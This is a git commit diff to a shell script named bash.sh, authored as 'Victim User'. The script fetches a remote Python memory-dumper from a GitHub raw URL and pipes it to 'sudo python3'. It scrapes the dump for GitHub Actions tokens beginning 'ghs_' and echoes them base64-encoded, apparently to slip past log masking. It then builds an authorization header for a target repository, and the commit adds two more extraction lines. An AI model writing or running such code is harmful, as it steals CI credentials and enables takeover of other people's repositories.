64c503085c343b870cd721b9634f3d87ed37218a
Victim User <46316318+r3s34rch@users.noreply.github.com>
2023-12-17 11:20:53 +0100

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -2,12 +2,20 @@
 set -e
 readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
 TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | awk 'NR==2' | xargs  `
+TOKEN_VAL0=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u  `
+TOKEN_VAL1=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 `
 TOKEN_VAL2=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 | base64 `
+
 echo "-----------------------------------------------------------------"
 echo "abc" "$TOKEN_VAL" "xyz"
 echo "-----------------------------------------------------------------"
+echo "$TOKEN_VAL0"
+echo "-----------------------------------------------------------------"
+echo "$TOKEN_VAL1"
+echo "-----------------------------------------------------------------"
 echo "$TOKEN_VAL2"
 echo "-----------------------------------------------------------------"
+
 #echo "https://api.github.com/repos/${REPO}/contents/README.md"
 Header="Authorization: token $TOKEN_VAL2"
 echo "$Header"
